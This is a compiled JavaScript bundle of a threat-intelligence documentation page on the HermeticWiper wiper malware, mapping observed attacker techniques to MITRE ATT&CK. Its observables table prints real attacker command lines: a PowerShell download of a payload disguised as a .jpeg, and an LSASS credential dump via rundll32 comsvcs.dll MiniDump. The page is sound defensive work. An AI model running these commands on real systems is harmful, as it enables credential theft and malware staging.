"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[5754],{3248:function(e,t,a){var r=a(7294),n=a(7273);n.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,r.useEffect)((function(){n.Z.contentLoaded()}),[]),r.createElement("div",{className:"mermaid"},t)}},8332:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return s},contentTitle:function(){return m},metadata:function(){return d},toc:function(){return p},default:function(){return u}});var r=a(7462),n=a(3366),i=(a(7294),a(4137)),l=a(3248),o=["components"],s={},m=void 0,d={unversionedId:"Sightings/HermeticWiper",id:"Sightings/HermeticWiper",isDocsHomePage:!1,title:"HermeticWiper",description:"Overview",source:"@site/docs/03-Sightings/12-HermeticWiper.md",sourceDirName:"03-Sightings",slug:"/Sightings/HermeticWiper",permalink:"/ac3-threat-sightings/docs/Sightings/HermeticWiper",tags:[],version:"current",sidebarPosition:12,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"UNK-Phishing",permalink:"/ac3-threat-sightings/docs/Sightings/UNK-Phishing"},next:{title:"WhisperGate",permalink:"/ac3-threat-sightings/docs/Sightings/WhisperGate"}},p=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat Actor used likely <em>WMI</em> and <em>Impacket</em> to execute <em>CMD</em> commands on victim endpoints for Command And Control.",id:"threat-actor-used-likely-wmi-and-impacket-to-execute-cmd-commands-on-victim-endpoints-for-command-and-control",children:[]},{value:"Threat Actor used <em>PowerShell</em> to download malware masqueraded as <em>.jpeg</em> file from <em>internal server</em> for Lateral Movement.",id:"threat-actor-used-powershell-to-download-malware-masqueraded-as-jpeg-file-from-internal-server-for-lateral-movement",children:[]},{value:"Threat Actor used <em>SCHTASKS</em> to periodically create malicious file at Windows Policy Definition folder for Persistence.",id:"threat-actor-used-schtasks-to-periodically-create-malicious-file-at-windows-policy-definition-folder-for-persistence",children:[]},{value:"Threat Actor used <em>CERTUTIL</em> to check internet connectivity for Discovery.",id:"threat-actor-used-certutil-to-check-internet-connectivity-for-discovery",children:[]},{value:"Threat Actor used <em>PowerShell</em> to download additional malware masqueraded as <em>jpeg</em> file from external server for Command And Control.",id:"threat-actor-used-powershell-to-download-additional-malware-masqueraded-as-jpeg-file-from-external-server-for-command-and-control",children:[]},{value:"Threat Actor used <em>COM+ Service DLL</em> to dump <em>LSASS</em> process memory via <em>RunDll32</em> and <em>PowerShell</em> for Credential Access.",id:"threat-actor-used-com-service-dll-to-dump-lsass-process-memory-via-rundll32-and-powershell-for-credential-access",children:[]},{value:"HermeticWiper used <em>valid digital signatures</em> to undermine security controls for Defense Evasion.",id:"hermeticwiper-used-valid-digital-signatures-to-undermine-security-controls-for-defense-evasion",children:[]},{value:"HermeticWiper used <em>embedded resources</em> to stage <em>EaseUS Partition Master</em> drivers for Defense Evasion.",id:"hermeticwiper-used-embedded-resources-to-stage-easeus-partition-master-drivers-for-defense-evasion",children:[]},{value:"HermeticWiper used <em>Native APIs</em> to execute the drivers as a <em>Windows Service</em> for Execution.",id:"hermeticwiper-used-native-apis-to-execute-the-drivers-as-a-windows-service-for-execution",children:[]},{value:"HermeticWiper used <em>AdjustTokenPrivileges</em> Native API to give itself <em>SeLoadDriverPrivilege</em>, <em>SeShutDownPrivilege</em> and <em>SeBackupPrivilege</em> privileges for Privilege Escalation.",id:"hermeticwiper-used-adjusttokenprivileges-native-api-to-give-itself-seloaddriverprivilege-seshutdownprivilege-and-sebackupprivilege-privileges-for-privilege-escalation",children:[]},{value:"HermeticWiper used <em>Native APIs</em> to stop the Volume Shadow Copy Service for Impact.",id:"hermeticwiper-used-native-apis-to-stop-the-volume-shadow-copy-service-for-impact",children:[]},{value:"HermeticWiper used <em>EaseUS Partition Master</em> drivers for direct access to storage devices to overwrite files for Impact.",id:"hermeticwiper-used-easeus-partition-master-drivers-for-direct-access-to-storage-devices-to-overwrite-files-for-impact",children:[]},{value:"HermeticWiper used <em>InitiateSystemShutdownEx</em> Native API to shutdown the system for Impact.",id:"hermeticwiper-used-initiatesystemshutdownex-native-api-to-shutdown-the-system-for-impact",children:[]}]}],c={toc:p};function u(e){var t=e.components,a=(0,n.Z)(e,o);return(0,i.kt)("wrapper",(0,r.Z)({},c,a,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h2",{id:"overview"},"Overview"),(0,i.kt)("p",null,"This Threat Sighting documents observed TTPs for HermeticWiper destructive malware. This Threat Sighting is based on public reports. It was discovered being deployed in Ukraine in 2022. After deleting volume shadow copies the malware abuses a legitimate EaseUS driver to destroy data on Windows systems."),(0,i.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_HermeticWiper.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_HermeticWiper.yml")),(0,i.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,i.kt)("p",null,"Acknowledgements: @TalosSecurity, Qualys Threat Research, Symantec's @threatintel, @TrellixLabs"),(0,i.kt)("h3",{id:"references"},"References:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/"},"https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://blog.talosintelligence.com/2022/02/threat-advisory-hermeticwiper.html"},"https://blog.talosintelligence.com/2022/02/threat-advisory-hermeticwiper.html")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"},"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://blog.qualys.com/vulnerabilities-threat-research/2022/03/01/ukrainian-targets-hit-by-hermeticwiper-new-datawiper-malware"},"https://blog.qualys.com/vulnerabilities-threat-research/2022/03/01/ukrainian-targets-hit-by-hermeticwiper-new-datawiper-malware")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://www.trellix.com/en-au/about/newsroom/stories/threat-labs/digging-into-hermeticwiper.html"},"https://www.trellix.com/en-au/about/newsroom/stories/threat-labs/digging-into-hermeticwiper.html"))),(0,i.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Threat Actor used likely ",(0,i.kt)("em",{parentName:"li"},"WMI")," and ",(0,i.kt)("em",{parentName:"li"},"Impacket")," to execute ",(0,i.kt)("em",{parentName:"li"},"CMD")," commands on victim endpoints for Command And Control."),(0,i.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,i.kt)("em",{parentName:"li"},"PowerShell")," to download malware masqueraded as ",(0,i.kt)("em",{parentName:"li"},".jpeg")," file from ",(0,i.kt)("em",{parentName:"li"},"internal server")," for Lateral Movement."),(0,i.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,i.kt)("em",{parentName:"li"},"SCHTASKS")," to periodically create malicious file at Windows Policy Definition folder for Persistence."),(0,i.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,i.kt)("em",{parentName:"li"},"CERTUTIL")," to check internet connectivity for Discovery."),(0,i.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,i.kt)("em",{parentName:"li"},"PowerShell")," to download additional malware masqueraded as ",(0,i.kt)("em",{parentName:"li"},"jpeg")," file from external server for Command And Control."),(0,i.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,i.kt)("em",{parentName:"li"},"COM+ Service DLL")," to dump ",(0,i.kt)("em",{parentName:"li"},"LSASS")," process memory via ",(0,i.kt)("em",{parentName:"li"},"RunDll32")," and ",(0,i.kt)("em",{parentName:"li"},"PowerShell")," for Credential Access."),(0,i.kt)("li",{parentName:"ul"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"li"},"valid digital signatures")," to undermine security controls for Defense Evasion."),(0,i.kt)("li",{parentName:"ul"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"li"},"embedded resources")," to stage ",(0,i.kt)("em",{parentName:"li"},"EaseUS Partition Master")," drivers for Defense Evasion."),(0,i.kt)("li",{parentName:"ul"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"li"},"Native APIs")," to execute the drivers as a ",(0,i.kt)("em",{parentName:"li"},"Windows Service")," for Execution."),(0,i.kt)("li",{parentName:"ul"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"li"},"AdjustTokenPrivileges")," Native API to give itself ",(0,i.kt)("em",{parentName:"li"},"SeLoadDriverPrivilege"),", ",(0,i.kt)("em",{parentName:"li"},"SeShutDownPrivilege")," and ",(0,i.kt)("em",{parentName:"li"},"SeBackupPrivilege")," privileges for Privilege Escalation."),(0,i.kt)("li",{parentName:"ul"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"li"},"Native APIs")," to stop the Volume Shadow Copy Service for Impact."),(0,i.kt)("li",{parentName:"ul"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"li"},"EaseUS Partition Master")," drivers for direct access to storage devices to overwrite files for Impact."),(0,i.kt)("li",{parentName:"ul"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"li"},"InitiateSystemShutdownEx")," Native API to shutdown the system for Impact.")),(0,i.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,i.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,i.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,i.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,i.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Execution"),(0,i.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,i.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,i.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Impact"),(0,i.kt)("td",{parentName:"tr",align:null},"+++ (3)")))),(0,i.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,i.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,i.kt)(l.Z,{chart:"\ngraph LR\nEXE[Execution] --\x3e | likely _WMI_ and _Impacket_ to execute _CMD_ commands on victim endpoints| C2[Command And Control]\nEXE[Execution] --\x3e | _PowerShell_ to download malware masqueraded as _.jpeg_ file from _internal server_| LatM[Lateral Movement]\nEXE[Execution] --\x3e | _SCHTASKS_ to periodically create malicious file at Windows Policy Definition folder| PER[Persistence]\nEXE[Execution] --\x3e | _CERTUTIL_ to check internet connectivity| D[Discovery]\nEXE[Execution] --\x3e | _PowerShell_ to download additional malware masqueraded as _jpeg_ file from external server| C2[Command And Control]\nEXE[Execution] --\x3e | _COM+ Service DLL_ to dump _LSASS_ process memory via _RunDll32_ and _PowerShell_| CA[Credential Access]\nEXE[Execution] --\x3e | _valid digital signatures_ to undermine security controls| DE[Defense Evasion]\nEXE[Execution] --\x3e | _embedded resources_ to stage _EaseUS Partition Master_ drivers| DE[Defense Evasion]\nDE[Defense Evasion] --\x3e | _Native APIs_ to execute the drivers as a _Windows Service_| EXE[Execution]\nEXE[Execution] --\x3e | _AdjustTokenPrivileges_ Native API to give itself _SeLoadDriverPrivilege_, _SeShutDownPrivilege_ and _SeBackupPrivilege_ privileges| PE[Privilege Escalation]\nEXE[Execution] --\x3e | _Native APIs_ to stop the Volume Shadow Copy Service| IMP[Impact]\nDE[Defense Evasion] --\x3e | _EaseUS Partition Master_ drivers for direct access to storage devices to overwrite files| IMP[Impact]\nEXE[Execution] --\x3e | _InitiateSystemShutdownEx_ Native API to shutdown the system| IMP[Impact]\n",mdxType:"Mermaid"}),(0,i.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"T1047 - Windows Management Instrumentation",(0,i.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used likely ",(0,i.kt)("em",{parentName:"td"},"WMI")," and ",(0,i.kt)("em",{parentName:"td"},"Impacket")," to execute ",(0,i.kt)("em",{parentName:"td"},"CMD")," commands on victim endpoints for Command And Control.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,i.kt)("td",{parentName:"tr",align:null},"T1570 - Lateral Tool Transfer",(0,i.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"PowerShell")," to download malware masqueraded as ",(0,i.kt)("em",{parentName:"td"},".jpeg")," file from ",(0,i.kt)("em",{parentName:"td"},"internal server")," for Lateral Movement.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,i.kt)("td",{parentName:"tr",align:null},"T1053.005 - Scheduled Task/Job: Scheduled Task",(0,i.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"SCHTASKS")," to periodically create malicious file at Windows Policy Definition folder for Persistence.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,i.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"CERTUTIL")," to check internet connectivity for Discovery.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"PowerShell")," to download additional malware masqueraded as ",(0,i.kt)("em",{parentName:"td"},"jpeg")," file from external server for Command And Control.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,i.kt)("td",{parentName:"tr",align:null},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,i.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,i.kt)("br",null),"T1218.011 - Signed Binary Proxy Execution: Rundll32",(0,i.kt)("br",null),"T1003.001 - OS Credential Dumping: LSASS Memory"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"COM+ Service DLL")," to dump ",(0,i.kt)("em",{parentName:"td"},"LSASS")," process memory via ",(0,i.kt)("em",{parentName:"td"},"RunDll32")," and ",(0,i.kt)("em",{parentName:"td"},"PowerShell")," for Credential Access.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,i.kt)("td",{parentName:"tr",align:null},"T1553.002 - Subvert Trust Controls: Code Signing"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"valid digital signatures")," to undermine security controls for Defense Evasion.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,i.kt)("td",{parentName:"tr",align:null},"T1140 - Deobfuscate/Decode Files or Information"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"embedded resources")," to stage ",(0,i.kt)("em",{parentName:"td"},"EaseUS Partition Master")," drivers for Defense Evasion.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Execution"),(0,i.kt)("td",{parentName:"tr",align:null},"T1106 - Native API",(0,i.kt)("br",null),"T1543 - Create or Modify System Process: Windows Service",(0,i.kt)("br",null),"T1569.002 - System Services: Service Execution",(0,i.kt)("br",null),"T1112 - Modify Registry"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"Native APIs")," to execute the drivers as a ",(0,i.kt)("em",{parentName:"td"},"Windows Service")," for Execution.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,i.kt)("td",{parentName:"tr",align:null},"T1106 - Native API",(0,i.kt)("br",null),"T1134 - Access Token Manipulation"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"AdjustTokenPrivileges")," Native API to give itself ",(0,i.kt)("em",{parentName:"td"},"SeLoadDriverPrivilege"),", ",(0,i.kt)("em",{parentName:"td"},"SeShutDownPrivilege")," and ",(0,i.kt)("em",{parentName:"td"},"SeBackupPrivilege")," privileges for Privilege Escalation.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Impact"),(0,i.kt)("td",{parentName:"tr",align:null},"T1106 - Native API",(0,i.kt)("br",null),"T1490 - Inhibit System Recovery"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"Native APIs")," to stop the Volume Shadow Copy Service for Impact.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Impact"),(0,i.kt)("td",{parentName:"tr",align:null},"T1561.002 - Disk Structure Wipe",(0,i.kt)("br",null),"T1561.001 - Disk Content Wipe"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"EaseUS Partition Master")," drivers for direct access to storage devices to overwrite files for Impact.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Impact"),(0,i.kt)("td",{parentName:"tr",align:null},"T1106 - Native API",(0,i.kt)("br",null),"T1529 - System Shutdown/Reboot"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"InitiateSystemShutdownEx")," Native API to shutdown the system for Impact.")))),(0,i.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"),(0,i.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"T1047",(0,i.kt)("br",null),"T1059.003"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used likely ",(0,i.kt)("em",{parentName:"td"},"WMI")," and ",(0,i.kt)("em",{parentName:"td"},"Impacket")," to execute ",(0,i.kt)("em",{parentName:"td"},"CMD")," commands on victim endpoints for Command And Control."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1')\\\"> \\\\\\\\127.0.0.1\\\\ADMIN$\\__[TIMESTAMP] 2>&1"),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1 CSIDL_WINDOWS\\\\policydefinitions\\\\postgresql.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1636727589.6007507 2>&1"),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1')),(0,i.kt)("td",{parentName:"tr",align:null},"- Patterns in the command-line arguments is consistent with Impackets ",(0,i.kt)("em",{parentName:"td"},"wmiexec.py")," script.",(0,i.kt)("br",null),"- ",(0,i.kt)("em",{parentName:"td"},"Impacket")," is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols.",(0,i.kt)("br",null),"- ",(0,i.kt)("em",{parentName:"td"},"Impacket")," contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.",(0,i.kt)("br",null),"- ",(0,i.kt)("a",{parentName:"td",href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py"},"https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py"))),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,i.kt)("td",{parentName:"tr",align:null},"T1570",(0,i.kt)("br",null),"T1059.001"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"PowerShell")," to download malware masqueraded as ",(0,i.kt)("em",{parentName:"td"},".jpeg")," file from ",(0,i.kt)("em",{parentName:"td"},"internal server")," for Lateral Movement."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1')\\\"> \\\\\\\\127.0.0.1\\\\ADMIN$\\__[TIMESTAMP] 2>&1")),(0,i.kt)("td",{parentName:"tr",align:null},'- "CSIDL_SYSTEM_DRIVE" is not on the list of recognized environment variables.',(0,i.kt)("br",null),"- ",(0,i.kt)("a",{parentName:"td",href:"https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables"},"https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables"))),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,i.kt)("td",{parentName:"tr",align:null},"T1053.005",(0,i.kt)("br",null),"T1059.003"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"SCHTASKS")," to periodically create malicious file at Windows Policy Definition folder for Persistence."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'schtasks /run /tn \\"\\\\Microsoft\\\\Windows\\\\termsrv\\\\licensing\\\\TlsAccess\\"'),(0,i.kt)("br",null),(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1 CSIDL_WINDOWS\\\\policydefinitions\\\\postgresql.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1636727589.6007507 2>&1")),(0,i.kt)("td",{parentName:"tr",align:null})),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,i.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"CERTUTIL")," to check internet connectivity for Discovery."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,i.kt)("inlineCode",{parentName:"td"},"trustsecpro[.]com"),(0,i.kt)("br",null),(0,i.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,i.kt)("inlineCode",{parentName:"td"},"whatismyip[.]com")),(0,i.kt)("td",{parentName:"tr",align:null})),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"PowerShell")," to download additional malware masqueraded as ",(0,i.kt)("em",{parentName:"td"},"jpeg")," file from external server for Command And Control."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,i.kt)("inlineCode",{parentName:"td"},"confluence.novus[.]ua")),(0,i.kt)("td",{parentName:"tr",align:null})),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,i.kt)("td",{parentName:"tr",align:null},"T1059.003",(0,i.kt)("br",null),"T1059.001",(0,i.kt)("br",null),"T1218.011",(0,i.kt)("br",null),"T1003.001"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"COM+ Service DLL")," to dump ",(0,i.kt)("em",{parentName:"td"},"LSASS")," process memory via ",(0,i.kt)("em",{parentName:"td"},"RunDll32")," and ",(0,i.kt)("em",{parentName:"td"},"PowerShell")," for Credential Access."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1'),(0,i.kt)("br",null),(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\"'),(0,i.kt)("br",null),(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full")),(0,i.kt)("td",{parentName:"tr",align:null},"- ",(0,i.kt)("em",{parentName:"td"},"comsvcs.dll")," is the ",(0,i.kt)("em",{parentName:"td"},"COM+ Service DLL")," in Windows.",(0,i.kt)("br",null),"- ",(0,i.kt)("em",{parentName:"td"},"comsvcs.dll MimiDump")," method is used to create processes memory dumps.",(0,i.kt)("br",null),"- The 